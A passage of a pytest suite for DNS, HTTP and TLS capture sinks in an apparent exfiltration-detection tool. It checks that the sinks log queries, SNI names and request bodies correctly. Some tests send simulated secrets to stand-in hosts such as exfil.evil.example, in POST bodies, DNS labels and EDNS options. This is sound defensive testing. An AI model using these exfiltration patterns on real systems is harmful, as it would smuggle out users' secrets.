    assert hits[-1]["raw"].startswith("\\x99")


def test_serve_marks_datagrams_the_kernel_truncated():
    module = load_sink_module("dns_sink.py")
    records = []
    answers = []

    class Log:
        def write(self, record):
            records.append(record)

    class FakeUdpSock:
        def __init__(self, packet, flags):
            self._packet = packet
            self._flags = flags
            self.nonblocking = False

        def recvmsg(self, size):
            if self.nonblocking:
                raise BlockingIOError  # a drained nonblocking socket has no datagram
            return self._packet[:size], [], self._flags, ("127.0.0.1", 5353)

        def setblocking(self, blocking):
            self.nonblocking = not blocking

        def sendto(self, payload, destination):
            answers.append(payload)

    stopping = threading.Event()

    class StopAfterOne(FakeUdpSock):
        def recvmsg(self, size):
            stopping.set()
            return super().recvmsg(size)

    query = build_dns_query(b"\x01\x02", "jumbo.evil.example")
    sock = StopAfterOne(query + b"\x00" * 5000, socket.MSG_TRUNC)
    module.serve(Log(), sock, socket.inet_aton(SINK_ANSWER), stopping)
    assert len(records) == 1
    assert records[0]["qname"] == "jumbo.evil.example"
    assert records[0]["capture_incomplete"] is True
    assert answers and answers[0][:2] == b"\x01\x02"


def test_dns_udp_random_garbage_is_logged_as_unparsed(dns_sink):
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.sendto(b"\x99\x88\x77\x66garbagegarbage", ("127.0.0.1", dns_sink["port"]))
    dns_query(dns_sink["port"], "after-garbage.evil.example")
    hits = read_records(dns_sink["log"], "dns")
    assert [hit["qname"] for hit in hits] == ["<unparsed>", "after-garbage.evil.example"]
    assert hits[0]["source_ip"] == "127.0.0.1"
    assert hits[0]["qtype"] == "unknown"
    assert hits[0]["raw"].startswith("\\x99\\x88wfgarbage")


def tcp_frame(payload: bytes) -> bytes:
    return len(payload).to_bytes(2, "big") + payload


def test_dns_over_tcp_two_queries_on_one_connection_are_answered_and_logged(dns_sink):
    first = build_dns_query(b"\x41\x01", "first-tcp.evil.example")
    second = build_dns_query(b"\x41\x02", "second-tcp.evil.example")
    with socket.create_connection(("127.0.0.1", dns_sink["port"]), timeout=SINK_TIMEOUT) as sock:
        sock.sendall(tcp_frame(first) + tcp_frame(second))
        responses = []
        for _ in range(2):
            length = int.from_bytes(recv_exact(sock, 2), "big")
            responses.append(recv_exact(sock, length))
    assert [response[:2] for response in responses] == [b"\x41\x01", b"\x41\x02"]
    assert all(response[-4:] == socket.inet_aton(SINK_ANSWER) for response in responses)
    hits = read_records(dns_sink["log"], "dns")
    assert [hit["qname"] for hit in hits] == ["first-tcp.evil.example", "second-tcp.evil.example"]
    assert all(hit["source_ip"] == "127.0.0.1" for hit in hits)


def test_dns_over_tcp_frames_past_the_budget_flag_incomplete_capture(dns_sink):
    module = load_sink_module("dns_sink.py")
    budget = module.TCP_MAX_FRAMES
    queries = [
        build_dns_query(index.to_bytes(2, "big"), f"bulk-{index}.evil.example")
        for index in range(budget + 1)
    ]
    with socket.create_connection(("127.0.0.1", dns_sink["port"]), timeout=SINK_TIMEOUT) as sock:
        sock.sendall(b"".join(tcp_frame(query) for query in queries))
        for _ in range(budget):
            length = int.from_bytes(recv_exact(sock, 2), "big")
            recv_exact(sock, length)
    deadline = time.monotonic() + SINK_TIMEOUT
    hits = read_records(dns_sink["log"], "dns")
    while time.monotonic() < deadline and not any(
        hit.get("capture_incomplete") is True for hit in hits
    ):
        time.sleep(0.05)
        hits = read_records(dns_sink["log"], "dns")
    parsed = [hit for hit in hits if hit["qname"] != "<unparsed>"]
    unparsed = [hit for hit in hits if hit["qname"] == "<unparsed>"]
    assert [hit["qname"] for hit in parsed] == [
        f"bulk-{index}.evil.example" for index in range(budget)
    ]
    assert len(unparsed) == 1
    assert unparsed[0]["capture_incomplete"] is True
    assert unparsed[0]["source_ip"] == "127.0.0.1"


def build_client_hello(sni: str, total: int) -> bytes:
    """Synthetic ClientHello handshake message padded to exactly `total` bytes."""
    name = sni.encode()
    sni_ext = b"\x00\x00" + (len(name) + 5).to_bytes(2, "big")
    sni_ext += (len(name) + 3).to_bytes(2, "big") + b"\x00" + len(name).to_bytes(2, "big") + name
    body = (
        b"\x03\x03"
        + bytes(32)
        + b"\x00"  # version, random, empty session id
        + b"\x00\x02\x13\x01"  # one cipher suite
        + b"\x01\x00"  # null compression
        + len(sni_ext).to_bytes(2, "big")
        + sni_ext
    )
    pad = total - 4 - len(body)
    assert pad >= 0
    return b"\x01" + (len(body) + pad).to_bytes(3, "big") + body + b"\x00" * pad


def tls_records(payload: bytes, chunk: int) -> bytes:
    return b"".join(
        b"\x16\x03\x01" + len(part).to_bytes(2, "big") + part
        for part in (payload[start : start + chunk] for start in range(0, len(payload), chunk))
    )


def test_tls_clienthello_past_the_read_limit_keeps_sni_and_flags_incomplete(http_sink):
    module = load_sink_module("http_sink.py")
    hello = build_client_hello("big-pq.evil.example", module.TLS_READ_LIMIT + 4096)
    wire = tls_records(hello, 60_000)
    sock = socket.create_connection(("127.0.0.1", http_sink["tls_port"]), timeout=SINK_TIMEOUT)

    def deliver():
        try:
            sock.sendall(wire[: module.TLS_READ_LIMIT + 469])
            sock.shutdown(socket.SHUT_WR)
        except OSError:
            pass

    threading.Thread(target=deliver, daemon=True).start()
    deadline = time.monotonic() + SINK_TIMEOUT
    hit = None
    while time.monotonic() < deadline:
        tls_hits = read_records(http_sink["log"], "tls")
        if tls_hits:
            hit = tls_hits[-1]
            break
        time.sleep(0.05)
    sock.close()
    assert hit is not None, "an oversized ClientHello was never logged"
    assert hit["sni"] == "big-pq.evil.example"
    assert hit.get("capture_incomplete") is True


class FakeTlsConn(SegmentedConn):
    def settimeout(self, timeout):
        pass


def run_handle_tls(segments: list[bytes]) -> dict:
    module = load_sink_module("http_sink.py")
    records = []

    class Log:
        def write(self, record):
            records.append(record)

    module.handle_tls(FakeTlsConn(segments), ("127.0.0.1", 40000), Log())
    return records[0]


def test_tls_read_past_the_limit_stays_within_the_parser_bound(tmp_path):
    from run.evidence import RunEvidence
    from run.sink_logs import read_sink_log
    from run.verdict import ReadOutcome, fuse

    module = load_sink_module("http_sink.py")
    hello = build_client_hello("big-pq.evil.example", module.TLS_READ_LIMIT + 8192)
    wire = tls_records(hello, 60_000)
    first = module.TLS_READ_LIMIT - 1
    record = run_handle_tls([wire[:first], wire[first : first + 4096]])
    assert record["total_bytes"] == module.TLS_READ_LIMIT
    assert record["capture_incomplete"] is True
    path = tmp_path / "tls.jsonl"
    path.write_text(json.dumps(record) + "\n")
    captured = read_sink_log(path)
    assert all("bounded hex" not in problem for problem in captured.problems)
    assert [hit.destination for hit in captured.tls_hits] == ["big-pq.evil.example"]
    assert fuse(ReadOutcome(), RunEvidence(tls_hits=captured.tls_hits)).verdict == "BLOCK"


def test_tls_clienthello_cut_short_before_the_record_completes_flags_incomplete():
    record = run_handle_tls([b"\x16\x03\x01\x00\x20\x01"])  # promises 32 bytes, sends 1
    assert record["sni"] is None
    assert record.get("capture_incomplete") is True


def test_tls_complete_clienthello_and_non_tls_contacts_are_not_flagged_incomplete():
    hello = build_client_hello("whole.evil.example", 200)
    whole = run_handle_tls([tls_records(hello, 60_000)])
    assert whole["sni"] == "whole.evil.example"
    assert "capture_incomplete" not in whole
    not_tls = run_handle_tls([b"\x00\x01\x02 not-tls\r\n"])
    assert not_tls["sni"] is None
    assert "capture_incomplete" not in not_tls
    empty = run_handle_tls([b""])
    assert empty["sni"] is None
    assert "capture_incomplete" not in empty


def real_client_hello(sni: str) -> bytes:
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    incoming, outgoing = ssl.MemoryBIO(), ssl.MemoryBIO()
    tls = context.wrap_bio(incoming, outgoing, server_side=False, server_hostname=sni)
    with pytest.raises(ssl.SSLWantReadError):
        tls.do_handshake()
    return outgoing.read()


def test_tls_real_clienthello_alone_is_hello_only():
    wire = real_client_hello("pypi.org")
    assert wire[0] == 0x16
    record = run_handle_tls([wire])
    assert record["sni"] == "pypi.org"
    assert record["hello_only"] is True
    assert record["hello_record_length"] == len(wire)
    assert record["total_bytes"] == len(wire)
    assert record["extra_bytes"] == 0
    assert "capture_incomplete" not in record


def test_tls_real_clienthello_split_across_tcp_segments_is_hello_only():
    wire = real_client_hello("pypi.org")
    record = run_handle_tls([wire[:7], wire[7:100], wire[100:]])
    assert record["hello_only"] is True
    assert record["total_bytes"] == len(wire)


def test_tls_validated_hello_gets_a_fatal_alert_and_stays_hello_only():
    wire = real_client_hello("pypi.org")
    module = load_sink_module("http_sink.py")
    conn = FakeTlsConn([wire])
    records = []

    class Log:
        def write(self, record):
            records.append(record)

    module.handle_tls(conn, ("127.0.0.1", 40000), Log())
    assert conn.sent == [module.TLS_FATAL_ALERT]
    assert records[0]["hello_only"] is True


def test_tls_clienthello_with_appended_application_data_is_not_hello_only():
    wire = real_client_hello("pypi.org")
    app = b"\x17\x03\x03\x00\x04dead"
    record = run_handle_tls([wire, app])
    assert record["hello_only"] is False
    assert record["hello_record_length"] == len(wire)
    assert record["total_bytes"] == len(wire) + len(app)
    assert record["extra_bytes"] == len(app)
    assert record["extra_prefix"] == app[:16].hex()
    coalesced = run_handle_tls([wire + app])
    assert coalesced["hello_only"] is False
    assert coalesced["extra_bytes"] == len(app)


def hello_wire(
    *,
    record_version=b"\x03\x01",
    legacy=b"\x03\x03",
    session_id=b"",
    cipher_suites=b"\x13\x01",
    compression=b"\x00",
    extensions=(),
    extension_blob=None,
    trailing=b"",
):
    if extension_blob is None:
        extension_blob = b"".join(
            int(kind).to_bytes(2, "big") + len(data).to_bytes(2, "big") + data
            for kind, data in extensions
        )
    body = legacy + bytes(range(32)) + bytes([len(session_id)]) + session_id
    body += len(cipher_suites).to_bytes(2, "big") + cipher_suites
    body += bytes([len(compression)]) + compression
    body += len(extension_blob).to_bytes(2, "big") + extension_blob + trailing
    handshake = b"\x01" + len(body).to_bytes(3, "big") + body
    return b"\x16" + record_version + len(handshake).to_bytes(2, "big") + handshake


def test_tls_valid_synthetic_clienthello_is_hello_only():
    wire = hello_wire(extensions=[(43, b"\x02\x03\x04"), (51, b"\x00\x1d\x00\x20" + bytes(32))])
    record = run_handle_tls([wire])
    assert record["hello_only"] is True
    assert record["capture_hex"] == wire.hex()


@pytest.mark.parametrize(
    "wire",
    [
        hello_wire(record_version=b"\x03\x00"),
        hello_wire(record_version=b"\x02\x01"),
        hello_wire(legacy=b"\x02\x00"),
        hello_wire(session_id=b"x" * 33),
        hello_wire(cipher_suites=b"\x13"),
        hello_wire(cipher_suites=b""),
        hello_wire(compression=b""),
        hello_wire(compression=b"\x01"),
        hello_wire(trailing=b"\x00"),
        hello_wire(extension_blob=b"\x00\x15\x00\x10\x00"),
        hello_wire(extensions=[(21, b"A" * 100)]),
        hello_wire(extensions=[(21, b"\x00" * 3000)]),
        hello_wire(extensions=[(21, b"\x00" * 17000)]),
    ],
)
def test_tls_malformed_clienthello_is_not_hello_only(wire):
    record = run_handle_tls([wire])
    assert record["hello_only"] is False


def test_tls_capture_hex_covers_extra_past_sixteen_bytes():
    wire = real_client_hello("pypi.org")
    extra = b"f" * 16 + b"BAITWATCH_FAKE_token-after-filler"
    record = run_handle_tls([wire + extra])
    assert record["hello_only"] is False
    assert record["capture_hex"] == (wire + extra).hex()
    assert record["extra_prefix"] == extra[:16].hex()


def test_tls_clienthello_split_across_two_records_is_not_hello_only():
    wire = real_client_hello("pypi.org")
    handshake = wire[5:]
    half = len(handshake) // 2
    split = (
        b"\x16\x03\x01"
        + half.to_bytes(2, "big")
        + handshake[:half]
        + b"\x16\x03\x01"
        + (len(handshake) - half).to_bytes(2, "big")
        + handshake[half:]
    )
    record = run_handle_tls([split])
    assert record["sni"] == "pypi.org"
    assert record["hello_only"] is False


def test_tls_clienthello_with_trailing_garbage_is_not_hello_only():
    wire = real_client_hello("pypi.org")
    record = run_handle_tls([wire + b"garbage!"])
    assert record["hello_only"] is False
    assert record["extra_bytes"] == 8


class SlowTlsConn(FakeTlsConn):
    def recv(self, size: int) -> bytes:
        data = super().recv(size)
        if data:
            return data
        raise TimeoutError("timed out")


def test_tls_peer_silent_through_the_drain_window_is_not_hello_only():
    wire = real_client_hello("pypi.org")
    module = load_sink_module("http_sink.py")
    records = []

    class Log:
        def write(self, record):
            records.append(record)

    started = time.monotonic()
    module.handle_tls(SlowTlsConn([wire]), ("127.0.0.1", 40000), Log())
    assert time.monotonic() - started < 2
    assert records[0]["hello_only"] is False
    assert records[0]["extra_bytes"] == 0


def test_tls_silent_raw_client_gets_the_fatal_alert_and_is_not_hello_only(http_sink):
    wire = real_client_hello("pypi.org")
    module = load_sink_module("http_sink.py")
    with socket.create_connection(
        ("127.0.0.1", http_sink["tls_port"]), timeout=SINK_TIMEOUT
    ) as sock:
        sock.sendall(wire)
        started = time.monotonic()
        hit = None
        while time.monotonic() - started < 5:
            hits = read_records(http_sink["log"], "tls")
            if hits:
                hit = hits[-1]
                break
            time.sleep(0.05)
        assert hit is not None, "sink waited for a slow client instead of logging"
        assert time.monotonic() - started < 4
        assert hit["hello_only"] is False
        assert hit["sni"] == "pypi.org"
        assert hit["extra_bytes"] == 0
        sock.settimeout(SINK_TIMEOUT)
        assert recv_exact(sock, 7) == module.TLS_FATAL_ALERT
        assert sock.recv(4096) == b""


def test_tls_raw_client_that_closes_after_the_alert_is_hello_only(http_sink):
    wire = real_client_hello("pypi.org")
    module = load_sink_module("http_sink.py")
    sock = socket.create_connection(("127.0.0.1", http_sink["tls_port"]), timeout=SINK_TIMEOUT)
    sock.sendall(wire)
    sock.settimeout(SINK_TIMEOUT)
    assert recv_exact(sock, 7) == module.TLS_FATAL_ALERT
    sock.close()  # an honest client gives up when the fatal alert arrives
    started = time.monotonic()
    hit = None
    while time.monotonic() - started < 5:
        hits = read_records(http_sink["log"], "tls")
        if hits:
            hit = hits[-1]
            break
        time.sleep(0.05)
    assert hit is not None, "the client contact was never logged"
    assert hit["hello_only"] is True
    assert hit["sni"] == "pypi.org"
    assert hit["total_bytes"] == len(wire)
    assert hit["extra_bytes"] == 0


def test_tls_real_ssl_client_handshake_failure_is_hello_only(http_sink):
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    with (
        pytest.raises(ssl.SSLError),
        socket.create_connection(
            ("127.0.0.1", http_sink["tls_port"]), timeout=SINK_TIMEOUT
        ) as sock,
    ):
        context.wrap_socket(sock, server_hostname="pypi.org")
    started = time.monotonic()
    hit = None
    while time.monotonic() - started < 5:
        found = [
            item for item in read_records(http_sink["log"], "tls") if item["sni"] == "pypi.org"
        ]
        if found:
            hit = found[-1]
            break
        time.sleep(0.05)
    assert hit is not None, "the ssl client contact was never logged"
    assert hit["hello_only"] is True
    assert hit["extra_bytes"] == 0


def test_tls_late_bytes_inside_the_drain_window_are_captured_and_not_hello_only(http_sink):
    wire = real_client_hello("pypi.org")
    module = load_sink_module("http_sink.py")
    late = b"\x17\x03\x03\x00\x04BAITWATCH_FAKE_late-tls-token"
    with socket.create_connection(
        ("127.0.0.1", http_sink["tls_port"]), timeout=SINK_TIMEOUT
    ) as sock:
        sock.sendall(wire)
        sock.settimeout(SINK_TIMEOUT)
        assert recv_exact(sock, 7) == module.TLS_FATAL_ALERT
        time.sleep(0.3)  # still inside the one second drain window
        sock.sendall(late)
        started = time.monotonic()
        hit = None
        while time.monotonic() - started < 5:
            hits = read_records(http_sink["log"], "tls")
            if hits:
                hit = hits[-1]
                break
            time.sleep(0.05)
    assert hit is not None, "the late sender was never logged"
    assert hit["hello_only"] is False
    assert hit["extra_bytes"] == len(late)
    assert late.hex() in hit["capture_hex"]


def test_tls_bytes_sent_after_the_drain_window_cannot_rescue_hello_only(http_sink):
    wire = real_client_hello("pypi.org")
    module = load_sink_module("http_sink.py")
    with socket.create_connection(
        ("127.0.0.1", http_sink["tls_port"]), timeout=SINK_TIMEOUT
    ) as sock:
        sock.sendall(wire)
        sock.settimeout(SINK_TIMEOUT)
        assert recv_exact(sock, 7) == module.TLS_FATAL_ALERT
        started = time.monotonic()
        hit = None
        while time.monotonic() - started < 5:
            hits = read_records(http_sink["log"], "tls")
            if hits:
                hit = hits[-1]
                break
            time.sleep(0.05)
        assert hit is not None, "the sink never closed the drain window"
        assert hit["hello_only"] is False
        # The window has closed; whatever is sent now is past the capture.
        with contextlib.suppress(OSError):
            sock.sendall(b"\x17\x03\x03\x00\x04BAITWATCH_FAKE_after-close" + b"A" * 4096)
    assert hit["total_bytes"] == len(wire)
    assert hit["extra_bytes"] == 0


def test_http_expect_100_continue_client_gets_interim_response_and_full_body_capture(http_sink):
    body = "bw_secret=" + "z" * 5000
    with socket.create_connection(
        ("127.0.0.1", http_sink["http_port"]), timeout=SINK_TIMEOUT
    ) as sock:
        sock.sendall(
            b"POST /continue HTTP/1.1\r\nHost: exfil.evil.example\r\n"
            b"Content-Length: " + str(len(body)).encode() + b"\r\nExpect: 100-Continue\r\n\r\n"
        )
        interim = recv_exact(sock, len(b"HTTP/1.1 100 Continue\r\n\r\n"))
        assert interim == b"HTTP/1.1 100 Continue\r\n\r\n"
        sock.sendall(body.encode())
        assert sock.recv(4096).startswith(b"HTTP/1.1 200 OK")
    hit = next(
        record for record in read_records(http_sink["log"], "http") if record["path"] == "/continue"
    )
    assert hit["body"] == body
    assert hit["body_truncated"] is False
    assert hit["headers"]["expect"] == "100-Continue"


def test_http_expect_header_with_an_unwaiting_client_still_captures_the_body(http_sink):
    body = "bw_secret=" + "q" * 6000
    status, response_body = http_request(
        http_sink["http_port"],
        "POST",
        "/expect",
        body=body,
        headers={"Host": "expect.evil.example", "Expect": "100-continue"},
    )
    assert status == 200
    assert response_body == b"ok"
    hit = next(
        record for record in read_records(http_sink["log"], "http") if record["path"] == "/expect"
    )
    assert hit["body"] == body
    assert hit["body_truncated"] is False


def test_http_chunked_body_is_drained_and_marked_truncated(http_sink):
    first = b"4\r\nbw_s"
    second = b"ecret=1\r\n0\r\n\r\n"
    with socket.create_connection(
        ("127.0.0.1", http_sink["http_port"]), timeout=SINK_TIMEOUT
    ) as sock:
        sock.sendall(
            b"POST /chunks HTTP/1.1\r\nHost: chunks.evil.example\r\n"
            b"Transfer-Encoding: chunked\r\n\r\n" + first
        )
        time.sleep(0.2)
        sock.sendall(second)
        sock.shutdown(socket.SHUT_WR)
        while sock.recv(4096):
            pass
    hit = next(
        record for record in read_records(http_sink["log"], "http") if record["path"] == "/chunks"
    )
    assert hit["body"] == (first + second).decode()
    assert hit["body_truncated"] is True


def test_dns_names_preserve_label_boundaries_and_all_questions(tmp_path):
    import io

    from run.sink_logs import read_sink_log

    module = load_sink_module("dns_sink.py")
    labels = [b"pypi", b"org/secret:.\xff", b"evil", b"com"]
    question = b"".join(bytes([len(label)]) + label for label in labels) + b"\0\0\1\0\1"
    second = b"\x06secret\x04evil\x03com\0\0\1\0\1"
    packet = bytes.fromhex("123401000002000000000000") + question + second
    output = io.StringIO()
    log = module.JsonlLog(output)
    module.log_query(log, "192.0.2.20", packet, module.parse_query(packet))
    records = [json.loads(line) for line in output.getvalue().splitlines()]
    assert [r["qname"] for r in records] == [
        r"pypi.org\047secret\058\046\255.evil.com",
        "secret.evil.com",
    ]
    path = tmp_path / "log"
    path.write_text(output.getvalue())
    assert read_sink_log(path).problems


def test_dns_expanded_name_and_long_sni_are_not_silently_cut():
    import io

    dns = load_sink_module("dns_sink.py")
    output = io.StringIO()
    labels = [b"\xff" * 60, b"\xff" * 60, b"evil", b"com"]
    question = b"".join(bytes([len(label)]) + label for label in labels) + b"\0\0\1\0\1"
    packet = bytes.fromhex("123401000001000000000000") + question
    dns.log_query(dns.JsonlLog(output), "192.0.2.20", packet, dns.parse_query(packet))
    assert json.loads(output.getvalue())["qname"].endswith(".evil.com")
    http = load_sink_module("http_sink.py")
    name = "a" * 246 + ".pypi.org.evil.com"
    assert http.parse_sni(tls_records(build_client_hello(name, 400), 500)) == name


def test_ambiguous_http_body_length_is_incomplete():
    import io

    module = load_sink_module("http_sink.py")
    output = io.StringIO()

    class Connection:
        def recv(self, count):
            return b""

        def sendall(self, data):
            pass

    module._log_request(
        Connection(),
        ("192.0.2.20", 80),
        module.JsonlLog(output),
        [b"GET /pkg HTTP/1.1", b"Host: pypi.org", b"Content-Length: 6", b"Content-Length: 6"],
        [b"GET", b"/pkg", b"HTTP/1.1"],
        b"",
    )
    assert json.loads(output.getvalue())["body_truncated"] is True


@pytest.mark.parametrize(
    "additional,counts,incomplete",
    [
        (bytes.fromhex("00002904d0000000000000"), "000000000001", False),
        (bytes.fromhex("00002904d000008000000c000a00086162636465666768"), "000000000001", False),
        (bytes.fromhex("00002904d0000080000008000a000461626364"), "000000000001", True),
        (bytes.fromhex("00002904d0000000000000") * 2, "000000000002", True),
        (bytes.fromhex("00002904d0000000000000"), "000100000001", True),
        (bytes.fromhex("00002904d0000000000001"), "000000000001", True),
        (bytes.fromhex("00002904d000000000000100"), "000000000001", True),
        (bytes.fromhex("00002904d0000000000004000a0001"), "000000000001", True),
        (bytes.fromhex("016100002904d0000000000000"), "000000000001", True),
        (bytes.fromhex("00000104d0000000000000"), "000000000001", True),
        (bytes.fromhex("00002904d0000100000000"), "000000000001", True),
        (bytes.fromhex("00002904d000000000000000"), "000000000001", True),
    ],
)
def test_dns_accepts_only_one_well_formed_edns0_opt(additional, counts, incomplete, tmp_path):
    import io

    from run.sink_logs import read_sink_log

    dns = load_sink_module("dns_sink.py")
    packet = (
        bytes.fromhex("123401000001" + counts)
        + build_dns_query(b"\x12\x34", "pypi.org")[12:]
        + additional
    )
    output = io.StringIO()
    dns.log_query(dns.JsonlLog(output), "192.0.2.20", packet, dns.parse_query(packet))
    record = json.loads(output.getvalue())
    assert bool(record.get("capture_incomplete")) is incomplete
    path = tmp_path / "dns.jsonl"
    path.write_text(output.getvalue())
    assert bool(read_sink_log(path).problems) is incomplete


@pytest.mark.parametrize(
    "options",
    [
        b"\x00\x0c\x00\x09secret=42",
        b"\x00\x0a\x00\x10client00secret42",
        b"\x00\x0a\x00\x08client00\x00\x0c\x00\x09secret=42",
        b"\x00\x0c\x00\x00",
        b"\x00\x0a\x00\x08client00\x00\x0a\x00\x08secret42",
        b"\x00\x0c\x01\x00" + b"secret\x00\n" * 32,
    ],
)
def test_dns_edns_payload_blocks_registry_downgrade(options, tmp_path):
    import io

    from run.evidence import RunEvidence
    from run.sink_logs import read_sink_log
    from run.verdict import ReadOutcome, fuse

    dns = load_sink_module("dns_sink.py")
    opt = bytes.fromhex("00002904d000000000") + len(options).to_bytes(2, "big") + options
    packet = (
        bytes.fromhex("123401000001000000000001")
        + build_dns_query(b"\x12\x34", "pypi.org")[12:]
        + opt
    )
    output = io.StringIO()
    dns.log_query(dns.JsonlLog(output), "192.0.2.20", packet, dns.parse_query(packet))
    path = tmp_path / "dns.jsonl"
    path.write_text(output.getvalue())
    captured = read_sink_log(path)
    assert fuse(ReadOutcome(), RunEvidence(dns_hits=captured.dns_hits)).verdict == "BLOCK"
    record = json.loads(output.getvalue())
    assert record["capture_incomplete"] is True
    assert "secret" in record["raw"] or options == b"\x00\x0c\x00\x00"
    assert "\\x00" in record["raw"]
    assert len(record["raw"]) <= dns.RAW_LIMIT
    assert captured.problems
